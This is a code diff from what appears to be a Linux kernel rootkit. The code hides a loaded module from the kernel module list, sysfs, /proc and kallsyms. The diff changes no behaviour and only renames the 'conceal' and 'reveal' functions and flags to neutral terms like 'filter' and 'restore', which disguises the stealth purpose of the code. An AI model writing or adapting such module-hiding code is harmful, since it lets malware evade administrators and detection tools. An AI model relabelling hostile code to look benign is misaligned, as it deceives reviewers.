@@ -71,7 +71,7 @@ static unsigned long              _neverc_krt_vmalloc_vis_start;
 static unsigned long              _neverc_krt_vmalloc_vis_end;
 
 /* ==================================================================== */
-/*  Init / module list visibility filter (conceal + reveal)              */
+/*  Init / module list visibility filter apply/restore              */
 /* ==================================================================== */
 
 int neverc_krt_vis_init(void)
@@ -92,13 +92,13 @@ int neverc_krt_vis_init(void)
 	return 0;
 }
 
-void neverc_krt_vis_conceal(struct neverc_krt_vis_state *state,
+void neverc_krt_vis_filter(struct neverc_krt_vis_state *state,
 			 struct neverc_krt_this_module *mod)
 {
 	struct list_head *our;
 	unsigned long n_raw, p_raw;
 
-	if (state->concealed) return;
+	if (state->filtered) return;
 
 	our = _neverc_krt_get_mod_list(mod);
 	if (neverc_krt_mem_read(&n_raw, &our->next, 8) ||
@@ -126,15 +126,15 @@ void neverc_krt_vis_conceal(struct neverc_krt_vis_state *state,
 	if (_neverc_krt_vis_mutex_unlock && _neverc_krt_module_mutex)
 		_neverc_krt_vis_mutex_unlock(_neverc_krt_module_mutex);
 
-	state->concealed = 1;
+	state->filtered = 1;
 }
 
-void neverc_krt_vis_reveal(struct neverc_krt_vis_state *state,
+void neverc_krt_vis_restore(struct neverc_krt_vis_state *state,
 			 struct neverc_krt_this_module *mod)
 {
 	struct list_head *our;
 
-	if (!state->concealed) return;
+	if (!state->filtered) return;
 
 	our = _neverc_krt_get_mod_list(mod);
 
@@ -166,7 +166,7 @@ void neverc_krt_vis_reveal(struct neverc_krt_vis_state *state,
 	if (_neverc_krt_vis_mutex_unlock && _neverc_krt_module_mutex)
 		_neverc_krt_vis_mutex_unlock(_neverc_krt_module_mutex);
 
-	state->concealed = 0;
+	state->filtered = 0;
 }
 
 /* ==================================================================== */
@@ -304,11 +304,11 @@ int neverc_krt_vis_kallsyms_filter(struct neverc_krt_vis_state *state,
 /*  Composite full visibility filter + cleanup                          */
 /* ==================================================================== */
 
-void neverc_krt_vis_full_conceal(struct neverc_krt_vis_state *state,
+void neverc_krt_vis_filter_full(struct neverc_krt_vis_state *state,
 			      struct neverc_krt_this_module *mod,
 			      const char *module_name)
 {
-	neverc_krt_vis_conceal(state, mod);
+	neverc_krt_vis_filter(state, mod);
 	neverc_krt_vis_sysfs_remove(state, mod);
 	neverc_krt_vis_proc_filter(state, module_name);
 	neverc_krt_vis_kallsyms_filter(state, module_name);
